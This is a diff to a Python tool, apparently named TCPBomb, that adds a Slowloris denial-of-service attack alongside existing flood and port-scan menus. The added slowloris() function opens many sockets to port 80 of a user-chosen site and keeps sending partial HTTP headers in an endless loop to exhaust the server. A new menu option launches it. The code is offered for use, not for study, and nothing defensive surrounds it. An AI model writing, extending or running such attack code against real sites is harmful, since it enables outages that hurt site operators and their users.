@@ -7,7 +7,23 @@ sl = 0
 global op
 
 global port
+
+global url
+
+url = ""
+
+port = 80
+
+threads = 0
+
+version = float(1.8)
+
+currentversion = requests.get('https://raw.githubusercontent.com/Dr4k0D3v/TCPBomb/main/version')
+
+currentversion = float(currentversion.text.replace(" ",""))
+
 isUpdate = False
+
 def update():
 
     global isUpdate
@@ -55,23 +71,102 @@ def update():
 
         isUpdate = False
 
-url = ""
-
-port = 80
-
-threads = 0
-
-version = float(1.7)
-
-currentversion = requests.get('https://raw.githubusercontent.com/Dr4k0D3v/TCPBomb/main/version')
-
-currentversion = float(currentversion.text.replace(" ",""))
-
 if(currentversion > version):
 
     open(".IsUp","w")
 
     update()
+
+
+def slowloris():
+
+    now = datetime.now();
+
+    hour = now.hour;
+
+    minute = now.minute;
+
+    second = now.second
+
+    socks = []
+
+    headers = [
+    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
+    "Accept-language: en-US,en,q=0.5"
+              ]
+
+    ip = getIp(url)
+
+    socket_count = 100
+
+    for _ in range(socket_count):
+
+        try:
+
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+            s.settimeout(4)
+
+            s.connect((ip, 80))
+
+        except socket.error:
+
+            break
+
+    socks.append(s)
+
+    for s in socks:
+
+        s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
+
+        for header in headers:
+
+            s.send(bytes("{}\r\n".format(header).encode("utf-8")))
+
+    while True:
+
+        now = datetime.now();
+
+        hour = now.hour;
+
+        minute = now.minute;
+
+        second = now.second
+
+        print(f"[{hour}:{minute}:{second}] Sending slowris attack to: {ip}")
+
+        for s in socks:
+
+            try:
+
+                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
+
+            except socket.error:
+
+                socks.remove(s)
+
+                try:
+
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+                    s.settimeout(4)
+
+                    s.connect((ip, 80))
+
+                    for s in socks:
+
+                        s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
+
+                        for header in headers:
+
+                            s.send(bytes("{}\r\n".format(header).encode("utf-8")))
+
+                except socket.error:
+
+                    continue
+
+    time.sleep(15)
+
 
 def getIp(domain):
 
@@ -281,8 +376,6 @@ def pr():
 
             print(f"[{hour}]:[{minute}]:[{second}] INFO: {sl} connections sends!")
 
-
-
 def scanMenu():
 
     print("_______________________")
@@ -379,6 +472,87 @@ def scanMenu():
 
                 print(f"[ERROR] {i}")
 
+def slowlorisMenu():
+
+    print("_______________________")
+
+    print("""
+
+
+
+    Configuration:
+
+
+
+        [1] - Set the URL!
+
+
+    Options:
+
+
+
+        [1] - Set URL
+
+        [2] - Start attack
+
+        [3] - Go to Main menu
+
+    """)
+
+    print("_______________________")
+
+    print("")
+
+    try:
+
+        while True:
+
+            op = int(input("--> "))
+
+            if op == 1:
+
+                global url
+
+                url = input('Set url --> ')
+
+            if(op > 3):
+
+                print("[INFO] Invalid option please try again!")
+
+            elif op == 2:
+
+                slowloris();
+                if(url == ""):
+
+                    print("[INFO] Url is not defined please set Url!")
+
+            elif op == 3:
+
+                time.sleep(2)
+
+                if os.name == 'nt':
+
+                    os.system("cls")
+
+                else:
+
+                    os.system("clear")
+
+                mainMenu()
+
+
+
+    except:
+
+            print("[INFO] Invalid options please try again!")
+
+            print("[INFO] Log of error in 2 seconds")
+
+            time.sleep(2)
+
+            for i in sys.exc_info():
+
+                print(f"[ERROR] {i}")
 
 
 def httpMenu():
@@ -665,7 +839,9 @@ def mainMenu():
 
     [3] - Port sccan
 
-    [4] - Exit
+    [4] - Attack slowloris
+
+    [5] - Exit
 
     """)
 
@@ -737,6 +913,21 @@ def mainMenu():
 
             elif op == 4:
 
+                time.sleep(2)
+
+                if os.name == 'nt':
+
+                    os.system("cls")
+
+                else:
+
+                    os.system("clear")
+
+                slowlorisMenu()
+
+
+            elif op == 5:
+
                 print("Bye")
 
                 break
@@ -752,6 +943,7 @@ def mainMenu():
             for i in sys.exc_info():
 
                 print(f"[ERROR] {i}")
+
 if(__name__ == "__main__" and not isUpdate ):
 
     mainMenu()
